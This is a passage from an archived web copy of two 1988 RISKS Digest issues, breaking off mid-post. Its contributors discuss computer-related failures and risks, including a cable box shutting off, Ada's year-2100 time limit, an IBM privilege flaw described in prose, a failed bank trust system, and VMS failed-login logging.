  Calendar bomb in the Ada language 
</A>
<DD>
<A HREF="#subj4.1">
Douglas Jones
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: PCs die of New Year Cerebration 
</A>
<DD>
<A HREF="#subj5.1">
Larry Rosenstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  GAO report on the Oct 19th crash... 
</A>
<DD>
<A HREF="#subj6.1">
Barry Shein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: null loops 
</A>
<DD>
<A HREF="#subj7.1">
Mike Linnig
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Bloody SSNs again 
</A>
<DD>
<A HREF="#subj8.1">
Hank Roberts
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: Non-ionizing radiation 
</A>
<DD>
<A HREF="#subj9.1">
Henry Spencer
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
RISKS in Cable TV?
</A>
</H3>
<address>
&lt;<A HREF="mailto:[...]">
[...]
</A>&gt;
</address>
<i>

</i><PRE>
Date: 26 Jan 88 11:09:02 GMT

On Sunday evening, Jan. 25, something very unusual happened at my house.
My wife and I often watch the CNN (Turner's Cable News Network) World News
Report.  This is a weekly compendium of stories from various local news
agencies around the world.  On this occasion we noted with interest a report
from the USSR.  It started off with some "noncontroversial" coverage, but
then things got exciting!

First, the Soviet-based agency began covering a story on the approx.  500,000
Soviet children who are now separated from their parents.  ("Hooray for
glasnost," I thought.  "Maybe they'll correct this now that they've admitted
it.")  Then, a few minutes into the story, wham!  There was a loud click at
the cable remote box, which turned itself OFF!  Not only that, a fluorescent
light on the same circuit ALSO went off.  The effect was very dramatic.  My
wife and I both looked at each other.  After just a few seconds fumbling with
the remote control, we discovered that a different story was being broadcast.

I wondered if we were the only ones to experince this, and sure enough,
when I tried to call the off-hours repair number, the line was busy.  About
5 minutes later, the box turned itself off again.  By then we were suspicious.
The cable company's service has been extremely reliable, and the box has never
winked off for no reason before.  I still don't know if the entire net or just
the boxes tuned to CNN.  My questions to RISKS are:

1) Could someone with specs to a standard cable remote box commandeer the
   satellite uplink and broadcast a "remove from service" signal to boxes
   tuned to a certain channel?  Or, if that wouldn't work, could someone 
   induce a power surge and trip circuit-breakers in the boxes themselves?

2) What exactly is in these boxes.  Could a cable company monitor which
   channel you're tuned to?  Can they eavesdrop on your house?

3) What other means might be possible to force a remote box to disconnect,
   and which methods might account for the failure of the fluorescent light?

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Re: U.S. Fears Satellites Damaged
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Mon, 25 Jan 88 23:07:42 EST
</i><PRE>

&gt; ..."There is no way you can protect the optical sensors on satellites" from
&gt; laser attacks, an Air Force official said. ...

Hmm, I can think of ways of doing it, and evidently so can the USAF:  the new
generation of early-warning satellites are claimed to have sensors that are
protected against laser damage.  Not the same satellites, admittedly (the
news story is clearly talking about the low-altitude spy satellites rather
than the high-altitude warning satellites), but I would suspect that the
technical people are not quite as helpless as the quote would indicate.
Certainly they have been aware of this potential problem for quite a while;
it is NOT new.

In fact... I seriously wonder whether the USAF's evidence is as good as the
story would suggest.  My recollection is that several of the recent major
arms treaties (not just the semi-defunct SALT II) explicitly specify that
no attempt will be made to interfere with "national technical means of
verification", which is treatyspeak for spy satellites.  Given the Reagan
administration's tendency to claim treaty violations at the slightest excuse,
one is compelled to wonder just how real and solid this problem is -- I don't
recall hearing of any treaty-violation complaints along these lines.

&gt; [However, the risks of laser interference or accidental triggering are worth
&gt; noting.  Adding to the risks of computing in SDI, might such a concerted
&gt; attack of simultaneous laser bursts on many satellite sensors be mistakenly
&gt; detected as the launch of a nuclear attack!?  PGN]

I'd be surprised if the sensors and the (computerized or human) interpreters
behind them were that stupid, especially when the problem is well-known.

Consider, too, that such a concerted attack on satellite sensors is precisely
analogous to, say, saboteurs simultaneously blowing up all the BMEWS missile-
warning radars:  it is itself an act of war, and an extremely ominous one,
pointless except as a prelude to a nuclear attack.  It in fact IS a strong
warning of imminent attack, although not quite an actual launch warning.

				Henry Spencer @ U of Toronto Zoology
				{allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
My country's misguided technology transfer policy
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
26 Jan 1988 17:02-PST
</i><PRE>
From: the terminal of Geoff Goodfellow &lt;Geoff@csl.sri.com&gt;

Paul Smee elucidates some of the questionable sensibilities of the US's
technology policy with respect to country blackballing.  I agree with all
points and would like to add how truly senseless this seemly misguided
policy is in today's (and tomorrow's) direction of technology development:
ubiquity, omnipresence, miniaturization.

PC's and friends used to be deskside/top fixtures.  Today, manufacturers the
likes of GRiD offer full blown 386 portables with 40MB disk and 8MB RAM,
etc., laptops that easily fit in half a brief case (and i suppose fairly
well in diplomatic pouches).  Not everyone's briefcase/bags are examined by
customs.  But to carry the picture into tomorrow when we'll have Dynabooks,
Dynacards (smart cards) and Dynawatches, will we be removing our wallets and
watches at custom's?  How long will it be before the standard functionality
of a smart credit-card-size computer or watch surpasses (or at least roughly
equals) the capabilities of today's desk/laptop's?

Halting technology transfer given the current trends to this US Citizen
and Resident of The North American Numbering Plan is likened to holding back
the flow of the ocean with an ever increasing number of brooms.

   [I fixed a spelling error and happened to ask Geoff about it.  He said
   his speller had barfed on that word, so -- assuming the word was absent
   from the dictionary -- he added the (accidentally, identically incorrectly
   spelled) word.  An interesting risk of using spellers.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Calendar bomb in the Ada language
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones%cs.uiowa.edu@RELAY.CS.NET">
jones%cs.uiowa.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon, 25 Jan 88 08:53:41 CST
</i><PRE>

The recent discussions of leap-year bombs lead to some speculation about
the likelyhood that a multitude of calendar bombs will show up around the
new-years day in the year 2000.  I would like to bring up an even larger
calendar bomb which is designed into the Ada language and will go off new-
years day in the year 2100.  This bomb is implied by the discussion in
section 9.6 of the Ada Reference Manual, MIL-STD-1815 (10 Dec 1980).  I don't
think it has been changed in any more recent revisions of the standard.

The type TIME is defined as a record of YEAR, MONTH, DAY, and SECOND, with
YEAR being an integer subrange from 1901 to 2099.  I would expect that an
implementation of Ada that fully conforms to the language specification
would be required to raise a CONSTRAINT_ERROR exception whenever an attempt
was made to compute a TIME value in a year after 2099.

In many real-time process control applications, the software must periodically
poll the state of the process under control.  The standard way of writing
such a polling loop is given in the example at the end of section 9.6 of the
manual, and it involves performing arithmetic on the current time-of-day,
represented as a variable of type TIME.  Thus, real-time process control
software written in Ada as it is defined today is required by the definition
of the language to stop functioning on new-years day, 2100.

I am unlikely to be around in 2100, but how likely is it that some Ada
applications will survive, burned into ROM, controlling what will, by then,
be outdated industrial process control equipment or old military hardware
(probably long-since sold as surplus to some fourth-rate army).  Furthermore,
I can imagine that, by 2100, huge piles of musty ADA code will keep the
books for many companies and nations, in just the way that reams of out-dated
COBOL code run many companies today.  The potential financial consequences of
a calendar bomb in this context are mind boggling.

I want to emphasize that this bomb is built into the language specification.
The language designers gave the implementors no latitude to perform time
arithmetic on some convenient representation and then make an expensive
conversion to YEAR, MONTH, DAY and SECOND.  Thus, common (and forgiving)
internal representations, such as milliseconds Anno Babbage, are explicitly
forbidden.
   				   Douglas W. Jones

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
 Re: PCs die of New Year Cerebration (RISKS-6.7)
</A>
</H3>
<address>
Larry Rosenstein 
&lt;<A HREF="mailto:lsr%apple.apple.com@RELAY.CS.NET">
lsr%apple.apple.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon, 18 Jan 88 15:33:53 pst
</i><PRE>
Organization: Advanced Technology Group, Apple Computer

I was helping teach a Pascal class during one of MIT's January sessions.  We
were getting ready for the class and discovered that some of the Pascal
compiler were broken -- they wouldn't compile correct programs.  The problem
was very strange because some machines would work but others wouldn't and
the problem would be intermittent.

It turns out that the compiler had some kind of date checking in it (perhaps
for licensing reasons), and that sometimes when booting a machine people
would type in the previous year (a common mistake).  This would make the
system date "too early" and the compiler wouldn't work.
                                                             Larry

           [This is a common phenomenon, and has been mentioned here 
           occasionally.  SCRIBE was the case previously mentioned.  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
GAO report on the Oct 19th crash...
</A>
</H3>
<address>
Barry Shein
&lt;<A HREF="mailto:bzs%bu-cs.bu.edu@bu-it.BU.EDU ">
bzs%bu-cs.bu.edu@bu-it.BU.EDU 
</A>&gt;
</address>
<i>
Tue, 26 Jan 88 11:34:06 EST
</i><PRE>

From an FNN item on the Ed Markey House report this AM:

Of the 12 computers used at the NYSE to transact trades 9 went down on
October 19th. They considered this to be a major contributor to the
chaos. There was no indication in the item (I haven't seen the report)
as to whether this was hardware or software tho they indicated the
crashes were caused by the "sheer volume" of the trades being
executed, not much of a clue really.

	-Barry Shein, Boston University

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: null loops
</A>
</H3>
<address>
Mike Linnig 
&lt;<A HREF="mailto:LINNIG%eg.ti.com@RELAY.CS.NET">
LINNIG%eg.ti.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Tue, 26 Jan 88 01:49 CDT
</i><PRE>

On a recent project that had two processors sharing memory, we discovered
(much to our regret) that a portion of the runtime (operating system)
executed a very tight loop during periods of no work to be done.

Unfortunately, the null loop, consisting of a branch to itself consumed
about 99.95 % of the available instruction bus bandwidth (a branch had no
internal operations to speak of) effectively locking out the other processor
on the bus.  Too bad, the other processor was to have interrupted the "idle"
processor when it completed its work.

We solved the problem by changing the null loop to do some floating point
operations inside the loop.  We didn't need the floating point calculations,
but we sure needed that bus bandwidth.

Mike Linnig, Texas Instruments

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Bloody SSNs again  (<A HREF="/Risks/6.13.html">RISKS-6.13</A>)
</A>
</H3>
<address>
Hank Roberts as MoFo fw
&lt;<A HREF="mailto:well!nightjob@lll-crg.llnl.gov ">
well!nightjob@lll-crg.llnl.gov 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 26 Jan 88 04:20:50 GMT

I went in today to give blood for the replacement account of a friend who is
dying of lymphoma.  The blood bank has revised their form.  They had to have
my Social Security Number before they would accept my blood.

Sigh.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: Non-ionizing radiation
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Mon, 25 Jan 88 23:08:34 EST
</i><PRE>

Unfortunately the QST article does not resolve the issue as completely as one
would like.  It reports on a Motorola investigation that made the usual
assumption that thermal effects are the only significant mechanism for harm
from non-ionizing radiation.  The trouble is that this is only an assumption,
although a widespread and fairly credible one; much of the fuss over long-term
biological effects centers on the possibility of non-thermal mechanisms.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.14.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.16.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-52</DOCNO>
<DOCOLDNO>IA012-000130-B024-20</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.16.html 128.240.150.127 19970217015342 text/html 23980
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:52:07 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 16</TITLE>
<LINK REL="Prev" HREF="/Risks/6.15.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.17.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.15.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.17.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 16</H1>
<H2> Wednesday, 27 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Computer error blamed for diplomatic fiasco 
</A>
<DD>
<A HREF="#subj1.1">
Bernard de Neumann
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  A feedback loop in tax preparation algorithms 
</A>
<DD>
<A HREF="#subj2.1">
Lawrence R. Bernstein via PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  IBM's meaning of "open" in the abbreviation OSI 
</A>
<DD>
<A HREF="#subj3.1">
Peter Sylvester
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Bank abandons fouled-up computer system 
</A>
<DD>
<A HREF="#subj4.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Business view of software productivity 
</A>
<DD>
<A HREF="#subj5.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  VMS and login failure logins 
</A>
<DD>
<A HREF="#subj6.1">
Jerry Leichter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Software Power Switches 
</A>
<DD>
<A HREF="#subj7.1">
Mike Russell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  A risk of using spelling checkers 
</A>
<DD>
<A HREF="#subj8.1">
Andy Freeman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: RISKS in Cable TV? 
</A>
<DD>
<A HREF="#subj9.1">
Andy Goldstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: Calendar bomb in the Ada language 
</A>
<DD>
<A HREF="#subj10.1">
Jim Purtilo
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Time Bombs in Bank Computers 
</A>
<DD>
<A HREF="#subj11.1">
John McLeod
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Computer error blamed for diplomatic fiasco
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Wed 27 Jan 88 17:10:57-PST
</i><PRE>

Bernard de Neumann of Marconi Research in Chelmsford, England, sent me an
article from the Sunday Telegraph, 10 January 1988:

Computer error causes a diplomatic nightmare
by Anne-Elisabeth Moutet in Paris

The French Foreign Ministry's Protocol Office has committed an extraordinary
gaffe by mistakenly inviting the Iranian charge' d'affaires to a party for
diplomats at the Elyse'e Palace.  [...] [France had of course broken ties with
Iran.]  Upon later interrogation, the Quai d'Orsay swore the whole mistake was
due to a computer error and formally apologised -- although Mr Mitterand
confided that he suspected the foreign minister, Mr Jean-Bernard Raimond, had
planned the whole thing to try to get back in the good graces of the Iranians.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
A feedback loop in tax preparation algorithms
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Wed 27 Jan 88 16:55:45-PST
</i><PRE>

Lawrence R. Bernstein, in an article entitled "The Great Tax-Form Headaches of
'88" (S.F. Chron) Personal Finance section, page 23), has discovered an
apparent recursion that California taxpayers must encounter in completing
their federal and state returns.  The state had a bright idea to peg the state
tax to the federal return.  Thus, you cannot complete your state return until
you have completed your federal Schedule A.  Unfortunately, as in past years,
you cannot complete your federal return until you have completed your state
return (assuming you want to pay the correct taxes).  A nice deadly embrace?
No, just an opportunity for many successive iterations through the state and
federal computations if you want to be precise.

Schedule CA is the new Cal form to itemize fed/state differences.  Details: 

  CA line 20.  Itemized deductions from federal Schedule A, line 26.

  CA line 21.  State, local, and foreign income taxes from federal
               schedule A, lines 5 and 7.

Strict adherence requires repeated iterations through federal schedule A and
state schedule CA until the process converges.  PGN's solution is of course to
declare the state taxes actually paid during 1987 and forget about the
iterative convergence.  Seems like common sense, but apparently not what is
implied if you wish to be accurate.  (I presume LRB finally figured out that
he should overpay the state somewhat during 1987, so he could take that amount
as the [larger] deduction!)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
The meaning of "open" in the abbreviation OSI -- IBM's version
</A>
</H3>
<address>
Peter Sylvester +49 228 303245 
&lt;<A HREF="mailto:GRZ027%DBNGMD21.BITNET@CUNYVM.CUNY.EDU">
GRZ027%DBNGMD21.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Wed, 27 Jan 88 15:51 CET
</i><PRE>

It seems that IBM is not able to understand the meaning of the word
"open" in the phrase "Open systems interconnection".  The company
offers a product called GTMOSI that should help to implement
OSI software for IBM MVS systems.

For more than half a year we have been trying to get a fix for severe
system integrity problems of this product.  Just by reading the
documentation -- the product is available only in "object code only"
format -- we discovered that something must be wrong:

The documentation says that application programs are able to use highly
privileged functions of the operating system but GTMOSI itself must not be
installed in an authorized library.  This means that at least one part of the
program system must do some trick. It turned out that the guilty party is one
small module (a few hundred bytes in size) running as a supervisor routine.

There is no clue how this supervisor routine identifies its caller, thus we
expected that all users on the same system can write a small program and use
the authorised function.  At that state of investigation (after half an hour
of reading the documentation) we disassembled the routine.

What we found was even worse than what we expected:

1: Any normal user program is able to get full authority of the
   CPU (supervisor state).

   This problem was solved after three months but a authorized
   function namely RACINIT can still be called from any program.

2: The program allows any sort of accounting records (SMF) to be
   written.

   This problem is not yet solved. The recent "fixes" reintroduced an
   integrity problem. Again we are able to destroy data in protected
   memory.

We just gave the program back to IBM so we can no longer follow up on
the problem.  The problem is a small design bug, the program had been
developed as a normal user program and later on some authorized
function was added.  The easiest solution was to "open" the system and
bypass all security features of the operating system.

Peter Sylvester -- GMD Bonn

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Bank abandons fouled-up computer system
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
27 Jan 88 09:54:11 PST (Wednesday)
</i><PRE>
From: Rodney Hoffman &lt;Hoffman.es@Xerox.COM&gt;

This is a follow-up to the story "$23-million computer banking snafu" in
<A HREF="/Risks/5.16.html">RISKS-5.16</A> (25 July 1987).  

That story told how Bank of America had lost $23 million trying to convert to a
new trust accounting and reporting system, a product of Premier Systems Inc. of
Wayne, Pa.  As one trust department official said at the time, "They committed
two cardinal sins.  They took down the old system before the new system was up
and running.  And they were the first big bank to install the system.  A key
rule in computer software is: Never go first."

Now they're giving up:

Edited and excerpted from the Los Angeles Times, Tuesday, January 26, 1988:

  B OF A ABANDONS COSTLY COMPUTER FOR TRUST CLIENTS

Bank of America acknowledged Monday that it has abandoned a computerized
accounting program after spending $60 million over several months in an
unsuccessful attempt to fix the system.  Recurring problems meant months of
delays in issuing account statements and a system that was supposed to attract
customers wound up driving away some and angering others.

The system, MasterNet, originally cost $20 million and took five years to
develop.  It was supposed to be up and running last March.  But from the
outset, MasterNet was plagued by computer crashes that shut it down for days at
a time.  Despite extra shifts of workers and consultants, the bank fell three
months behind in delivering account statements to clients. Since the problems
began, customer accounts which may total billions of dollars have left.

Following an internal investigation, two bank executives were forced to resign
in November after being held responsible for the difficulties.  Scrapping the
system is now expected to lead to substantial layoffs.

Most of the bank's $34 billion in institutional trust accounts will be
transferred to subsidiary Seafirst National Bank in Seattle.  Seafirst uses a
IBM-based computerized accounting system devised by SEI Corp. of Wayne, Pa.  It
was designed 15 years ago and was last updated in 1981.  5% of the accounts are
too complicated for that system, and those will be given, not sold, to State
Street Bank of Boston, according to one anonymous source.

    [Also noted by Randy Neff &lt;neff@shasta.stanford.edu&gt;]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Business view of software productivity
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
27 Jan 88 13:06:38 PST (Wednesday)
</i><PRE>
From: Rodney Hoffman &lt;Hoffman.es@Xerox.COM&gt;

The 'Wall Street Journal' for Friday, Jan. 22, 1988 ran a page 1 story with the
headline PATCHING UP SOFTWARE OCCUPIES PROGRAMMERS AND DISABLES SYSTEMS

The story breaks no new ground.  Using mainly examples from the banking and
securities industry, it recites the typical stories:  

  * Programmers spending 80% of their time repairing and updating software.
  * Projects 100% over budget and a year behind schedule.
  * Computer hardware and speed overwhelming programmers.
  * Computer departments with three years backlog.
  * New management changing specs or discarding whole systems.
  * Little correlation between management goals and the way the 
    computer department spends its money. 
  * Program documentation shortcomings.
  * Productivity of 5 to 10 lines of code a day.
  * Unrealized promises of fourth-generation programming languages and
    computer-aided software engineering.
  
A couple of quotes:

  Ken Hamilton, a senior VP at Manufacturers Hanover, says one programmer 
  labeled the parts of his program using the initials of his friends...
  Once dozens of programmers leave their mark on software as it starts moving
  through its life cycle of 10 to 20 years, it becomes like a dangerous inner
  tube.  "It's been patched and extended and enhanced to the point that it is 
  now a maintenance nightmare," says Michael Bealmear, a partner at Coopers 
  &amp; Lybrand. 
  
  Some hope for a solution [to low software productivity] is seen in what 
  are called fourth-generation languages... This is like giving reporters 
  something that would let them just write an outline for an article rather
  than having to write the whole thing.  Some users talk of quintupled
  productivity... But the new languages... may work just for one part of a
  project on one type of operating-system software on one type of computer.
  Software that uses them also runs more slowly.... New Jersy's vehicle-
  registration and driver-license operations slowed almost to a halt a few
  years ago, and officials are still sorting through the mess....
  
  IBM says it has been improving its programmers' productivity about 7% a
  year simply by managing matters more carefully. 
  
  "It took us a lot of years to get into this mess," says Ray Stanley, a VP
  at American Express Co., "and it's going to take us a lot of years to get
  out of it." 

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
VMS and login failure logins
</A>
</H3>
<address>
LEICHTER-JERRY@CS.YALE.EDU
&lt;<A HREF="mailto:"Jerry Leichter ">
"Jerry Leichter 
</A>&gt;
</address>
<i>
Wed, 27 Jan 88 12:35 EST
</i><PRE>

Recent notes on these lists have reported a "bug" in VMS, in which a failed
login attempt can cause the username being logged into to be reported at the
system console.  Since it is a common error for a typist to get "out of sync"
with the prompts and enter his password for his username, this can reveal a
password.

The "bug", however, is in a faulty - and foolish - setting of a VMS parameter
at the site involved.  VMS will log the actual username typed in EXACTLY one
case:  When it has decided that an attempted breakin may be in progress at the
terminal.  It so decides when it sees more than L failed login attempts from
the same source with T seconds.  L is normally 5, and T is normally 300.  "The
same source" specifies a physical source - a terminal line or a specific
remote network node - and, optionally, a particular username.

The site at issue here had set L to either 1 or 2 - the message was ambiguous,
since it said "2" but then described a scenario in which the second attempt to
log in caused a message with the username to be logged, which would imply that
L was actually 1.  In any case, both 1 and 2 are absurd choices; they are
presuming a breakin attempt as the result of ONE typo!  Apparently the system
manager at this site doesn't understand the various elements of the VMS login
security system.  For example, if his goal was simply to get a security alarm
on a failed login, he could have done that directly (SET AUDIT/ENABLE:LOGFAIL).
Those alarm messages do not contain the username.

To answer two obvious questions:

	- Why include the username information at all, ever?  It's needed
		sometimes.  If you came in on Monday and found a record of
		several hundred failed attempts to log in, wouldn't you
		think it important to know which accounts had been the
		targets?  Obviously, there are risks in recording this
		information; but there are also risks in NOT recording it.
		VMS tries to balance them by only logging this information
		in situations that are very unlikely to arise accidentally.
		You can change the balance any way you like.  This site had
		unwittingly changed the balance to "record very often".

	- Why log the information to the console, "where everyone can see it",
		rather than only to a log file?  A log file can be altered;
		it's much harder to alter a paper record.  If you really don't
		want security messages to appear on the console, you can
		disable them (REPLY/DISABLE:SECURITY).

		In any case, a site seriously concerned with security must
		provide physical security for its console terminal!

I've seen more harm done by security managers who didn't understand basic
security issues than by almost any other single group.  If you manage security
on a VMS system, read the "Guide to VAX/VMS System Security", CAREFULLY,
before you start screwing around with the VMS security systems.  Then read it
AGAIN, and really understand what you are trying to accomplish and what the
side-effects will be, before you start changing defaults that are not
haphazard but the result of some thought, design, and review.
    							           Jerry

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
     Software Power Switches
</A>
</H3>
<address>
&lt;<A HREF="mailto:SC400000@BROWNVM">
SC400000@BROWNVM
</A>&gt;
</address>
<i>
Wed, 27 Jan 88 12:57:58 EST
</i><PRE>

I was recently using my SHARP EL-506P calculator when it hung up.  I wasn't
   in the middle of an important calculation, so I tried to clear it and
   finally, pressed the OFF button.  But, alas, the OFF button was locked
   along with the rest of the keypad.  So, I popped the back cover off and
   pulled out the batteries, put them back in and I was back in business.
   I'd have to assume that SHARP never expected their calculator code to
   hang so felt that a processor controlled OFF button was fine.  What if
   it had been one of the solar-powered calculators?  I'd have shut off my
   office lights and waited, I suppose.
                                        -Mike Russell

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
A risk of using spelling checkers
</A>
</H3>
<address>
Andy Freeman 
&lt;<A HREF="mailto:ANDY@Sushi.Stanford.EDU">
ANDY@Sushi.Stanford.EDU
</A>&gt;
</address>
<i>
Wed 27 Jan 88 06:34:56-PST
</i><PRE>

In RISKS DIGEST 6.15, you wrote:
   [I fixed a spelling error and happened to ask Geoff about it.  He said
   his speller had barfed on that word, so -- assuming the word was absent
   from the dictionary -- he added the (accidentally, identically incorrectly
   spelled) word.  An interesting risk of using spellers.  PGN]

I think that someone at PARC studied this and discovered that a larger
word list is bad thing for precisely this reason, i.e., English isn't
quite sparse enough.  This work discussed what good sizes were and may
have mentioned contents as well.

Of course, some languages are more sparse (the lexical distance between
words tends to be larger than it is in English) while others are less
sparse.  I've heard that Russian is a sparser language than English
while Arabic is less sparse.

In other words, the risks of using "lookup a word" spelling checkers
are language dependent.
                                     -andy

ps - Brian Smith noted than English is just about right for crossword
puzzles in two dimensions while Russian crossword puzzles should have
